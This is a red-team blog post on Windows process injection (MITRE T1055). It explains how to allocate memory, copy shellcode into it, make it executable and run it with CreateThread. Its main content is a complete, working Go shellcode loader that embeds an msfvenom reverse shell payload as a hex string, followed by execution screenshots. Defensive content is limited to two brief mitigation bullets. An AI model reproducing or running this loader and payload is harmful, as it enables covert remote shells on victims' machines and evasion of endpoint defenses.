---
title: Process Injection -> CreateThread
date: 2022-04-01 05:49:33 +0800
categories: [Red Teaming, Defense Evasion]
tags: []  
---

# MITRE
- ID : `T1055`
- Tactic : `Defense Evasion`
- Platforms: `Windows`

# CreateThread

Is a function from `Kernel32.dll` windows module that Creates a thread to execute within the virtual address space of the calling process.

Adversaries may leverage the Windows `CreateThread` function from Kernel32.dll to execute a malicious code within the virtual address space of the calling process.

## Technigues

## VirtualAlloc

Is a function from `kernel32.dll` windows module that reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. We will use this function to `allocate a memory block for our shellcode`. By setting the page permissions to `Read/Write`, we can be able to copy our malicious code to the allocated memory space.

## RtlCopyMemory

Is a function from `ntdll.dll` windows module that copies the contents of a source memory block to a destination memory block. We will use this function to `copy our shellcode to the allocated memory block`. For this to work, the destination memory block must have atleast `Read/Write` permission set.

## VirtualProtect

Is a function from `kernel32.dll` windows module that changes the protection on a region of committed pages in the virtual address space of the calling process.
We will use this function to `change the permission of the allocated memory block` from Read/Write to `Execute/Read`, This permission will allow us to execute our shellcode.

## CreateThread

We will use this function to create a thread that will `execute our shellcode`.

## WaitForSingleObject

Is a function from `kernel32.dll` windows module that waits until the specified object is in the signaled state or the time-out interval elapses.
We will use this function to make the program wait for our shellcode to be executed before exiting.

# Code

```golang

package main

import (
	"encoding/hex"
	"errors"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Reverse Shell Payload Generated With Msfvenom
const (
	SHELLCODE = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc020003e8c0a82b0141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5"
)

// Windows Modules And Functions
var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	ntdll    = windows.NewLazySystemDLL("ntdll.dll")

	virtualAlloc        = kernel32.NewProc("VirtualAlloc")
	rtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
	virtualProtect      = kernel32.NewProc("VirtualProtect")
	createThread        = kernel32.NewProc("CreateThread")
	waitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

// Main Function
func main() {
	log.Println("[+] Process Injection: CreateThread...")

	// Convert SHELLCODE From hex String to bytes
	shellcodeByte := decodeShellcode(SHELLCODE)

	// Variables Needed To Invoke VirtualAlloc
	var shellcodeSize uint32 = uint32(len(shellcodeByte))
	var flAllocationType uint32 = windows.MEM_COMMIT | windows.MEM_RESERVE
	var flProtect uint32 = windows.PAGE_READWRITE

	//Invoke VirtualAlloc To Allocate Memory Block For Our Shellcode
	bAddr, errVirtualAllocProc := virtualAllocProc(shellcodeSize, flAllocationType, flProtect)
	exitError(errVirtualAllocProc)
	log.Println("[+] Memory Allocated At: ", uintptr(bAddr))

	//Invoke RtlCopyMemory To Copy Our Shellocode To The Allocated Memory.
	errRtlCopyMemoryProc := rtlCopyMemoryProc(bAddr, &shellcodeByte[0], shellcodeSize)
	exitError(errRtlCopyMemoryProc)

	//Variable Needed To Invoke VirtualProtect
	var flNewProtect uint32 = windows.PAGE_EXECUTE_READ

	//Invoke VirtualProtect To Change Permission Of The Allocated Memory Block To Execute/Read
	errVirtualProtectProc := virtualProtectProc(bAddr, shellcodeSize, flNewProtect, &flProtect)
	exitError(errVirtualProtectProc)
	log.Println("[+] Permission Changed To PAGE_EXECUTE_READ")

	//Invoke CreateThread To Execute Our Shellcode
	tHandle, errCreateThreadProc := createThreadProc(bAddr)
	exitError(errCreateThreadProc)
	log.Println("[+] Shellcode Executed")

	//Invoke WaitForSingleObject To Wait For Our Shellcode To Be Executed Completely.
	errWaitForSingleObjectPro := waitForSingleObjectProc(tHandle)
	exitError(errWaitForSingleObjectPro)

}

// ExitError Handles Errors
func exitError(err error) {
	if err != nil {
		log.Fatal(err.Error())
	}
}

//DecodeShellcode Convert Shellcode to Bytes Array
func decodeShellcode(shellcode string) []byte {
	shellcodeByte, errShellcode := hex.DecodeString(shellcode)
	if errShellcode != nil {
		log.Fatal("[-] Error Decoding Shellcode")
	}

	return shellcodeByte
}

// virtualAllocProc Allocates Memory Block
func virtualAllocProc(dwSize, flAllocationType, flProtect uint32) (uintptr, error) {
	bAddr, _, errVirtualAlloc := virtualAlloc.Call(
		uintptr(0),
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return 0, errors.New("[-] Error: VirtualAlloc")
	}

	return bAddr, nil
}

// rtlCopyMemoryProc Copies Shellcode to The Allocated Memory Block
func rtlCopyMemoryProc(destination uintptr, source *byte, size_t uint32) error {
	_, _, errRtlCopyMemory := rtlCopyMemory.Call(
		uintptr(destination),
		uintptr(unsafe.Pointer(source)),
		uintptr(size_t))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		return errors.New("[-] Error: RtlCopyMemory")
	}

	return nil

}

// virtualProtectProc Changes The Permission To Execute/Read
func virtualProtectProc(lpAddress uintptr, dwSize, flNewProtect uint32, floldProtect *uint32) error {
	_, _, errVirtualProtect := virtualProtect.Call(
		lpAddress,
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(unsafe.Pointer(floldProtect)))

	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		return errors.New("[-] Error: VirtualProtect")
	}

	return nil
}

// createThreadProc Executes Shellcode
func createThreadProc(lpStartAddress uintptr) (uintptr, error) {
	tHandle, _, errCreateThread := createThread.Call(
		uintptr(0),
		uintptr(0),
		lpStartAddress,
		uintptr(0),
		uintptr(0),
		uintptr(0))

	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
		return tHandle, errors.New("[-] Error: CreateThread")
	}

	return tHandle, nil
}

// waitForSingleObjectProc Wait For Shellcode.
func waitForSingleObjectProc(tHandle uintptr) error {
	_, _, errWaitForSingleObject := waitForSingleObject.Call(
		tHandle,
		0xFFFFFFFF)

	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
		return errors.New("[-] Error: WaitForSingleObject")
	}

	return nil
}

```

# Execution

![createthread](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/createthread1.png)

![createthread](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/createthread3.png)

![createthread](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/createthread2.png)

# Mitigations

- Behavior Prevention on Endpoint.
- Privileged Account Management.

# References

- [https://attack.mitre.org/techniques/T1055/](https://attack.mitre.org/techniques/T1055/)

- [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)

- [https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

- [https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

- [https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory)

- [https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)

